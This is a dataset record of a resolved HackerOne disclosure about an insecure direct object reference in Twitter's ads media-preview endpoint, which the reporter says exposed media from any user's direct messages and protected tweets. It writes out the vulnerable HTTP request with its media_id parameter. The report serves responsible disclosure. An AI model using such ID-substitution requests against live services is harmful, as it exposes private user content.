---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '99600'
original_report_id: '99600'
title: 'Urgent : Unauthorised Access to Media content of all Direct messages and protected
  tweets(Indirect object reference)'
weakness: Improper Authentication - Generic
team_handle: x
created_at: '2015-11-14T02:52:03.041Z'
disclosed_at: '2018-03-21T23:09:55.963Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 37
tags:
- hackerone
- improper-authentication-generic
---

# Urgent : Unauthorised Access to Media content of all Direct messages and protected tweets(Indirect object reference)

## Metadata

- HackerOne Report ID: 99600
- Weakness: Improper Authentication - Generic
- Program: x
- Disclosed At: 2018-03-21T23:09:55.963Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi Team,

You can tweet from your ad account while creating a campaign.When you add a media content from your computer and upload it there is a Json request which gives you the link of your media(Photos) to preview before Tweeting.This link is Vulnerable to IDOR Attack and it leads to disclose all the media content of twitter.I have checked and verified that it discloses the media content of any user's Direct messages and also protected tweets.

Vulnerable HTTP request : 

GET /media_id_to_cdn_url.json?media_id=[Media_id]&_=1447455982153 HTTP/1.1
Host: ads.twitter.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Referer: https://ads.twitter.com/accounts/18ce53x5krr/campaigns/5936943/copy?campaign_type=followers&promoted_account=true&source=campaign_dashboard
Cookie: [Cookie_values]
Connection: keep-alive

Here Media_id is vulnerable to IDOR attack and it leads to give you the exact link of the Media content(Photos).

For more Information I am providing Video POC :
Link : https://youtu.be/GMZgEqej61M

This is a critical issue ,Kindly Fix it in priority.

Best Regards !
Vijay Kumar

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
